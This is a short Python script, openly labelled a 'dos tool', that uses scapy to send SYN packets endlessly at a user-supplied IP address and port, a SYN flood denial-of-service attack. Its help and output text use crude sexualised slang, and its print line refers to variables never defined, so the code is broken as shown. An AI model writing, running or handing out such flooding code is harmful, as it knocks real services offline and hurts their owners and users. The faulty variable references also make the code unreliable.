from scapy.all import IP, TCP, send
import sys
import argparse


# cli args
parser = argparse.ArgumentParser(description="fowler flooder, best dos tool")
parser.add_argument("ip", help="what ip u tryna molest")
parser.add_argument("port", type=int, help="what port u molesting today")

args = parser.parse_args()


# Build SYN packet
packet = IP(dst=args.ip)/TCP(dport=args.port, flags="S")

print(f"{target_ip}:{target_port} just got molested by D-D-D-D-D-DJ Fowlerrrrrr")

# Send it
while True:
    send(packet, verbose=False)